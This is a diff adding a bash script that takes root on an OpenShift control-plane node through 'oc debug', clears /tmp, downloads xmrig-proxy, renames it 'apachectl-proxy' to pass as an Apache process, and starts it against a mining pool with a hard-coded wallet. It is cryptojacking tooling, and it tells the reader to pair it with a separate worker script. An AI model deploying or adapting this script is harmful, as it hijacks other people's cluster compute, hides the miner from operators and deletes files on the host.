@@ -1,0 +1,52 @@
+#!/bin/bash
+
+# ------------------------ CONFIGURATION ------------------------
+
+wallet="Q010500b83cec4864900606a3f87fe0a1e15b277f75a257a70f47750e87faa2ba8f9addab6f528e"
+proxy_port="3333"
+
+# ------------------------ DETECT PROXY NODE ------------------------
+
+proxy_node=$(oc get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}' \
+  | grep -iE 'control-plane|master' | awk '{print $1; exit}')
+
+if [[ -z "$proxy_node" ]]; then
+  echo "❌ Could not detect a proxy node (master/control-plane)"
+  exit 1
+fi
+
+proxy_ip=$(oc get node "$proxy_node" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
+echo "✅ Selected proxy node: $proxy_node (IP: $proxy_ip)"
+
+# ------------------------ RUN XMRIG-PROXY ------------------------
+
+echo "🚀 Starting xmrig-proxy on $proxy_node..."
+worker_name=$(echo "$proxy_node" | awk -F'.' '{print $2}')
+
+oc debug node/$proxy_node <<EOF
+  chroot /host
+  su -
+  echo "🧠 Deploying xmrig-proxy on $proxy_node"
+  cd /tmp
+  rm -rf *
+  pkill -9 apachectl-proxy
+  pkill -9 xmrig-proxy
+  echo 4096 > /proc/sys/vm/nr_hugepages
+  sysctl -p
+
+  PROXY_IP=$(hostname -I | awk '{print $3}')
+  echo \$PROXY_IP > /tmp/proxy_ip.txt
+
+  curl -L -O https://github.com/xmrig/xmrig-proxy/releases/download/v6.23.0/xmrig-proxy-6.23.0-linux-static-x64.tar.gz
+  tar --no-same-owner -xzvf xmrig-proxy-6.23.0-linux-static-x64.tar.gz
+  cd xmrig-proxy-6.23.0/
+  mv xmrig-proxy apachectl-proxy
+  ./apachectl-proxy -o de.qrl.herominers.com:5555 -b 0.0.0.0:$proxy_port -B -S --log-file=xmrig-proxy.log -a randomx -u $wallet.$worker_name -k --tls
+  exit
+  exit
+  exit
+EOF
+
+echo "✅ xmrig-proxy running on $proxy_node"
+echo "📡 Detected Proxy IP: $proxy_ip"
+echo "🔗 Use this IP in herominer_worker.sh as PROXY_IP"
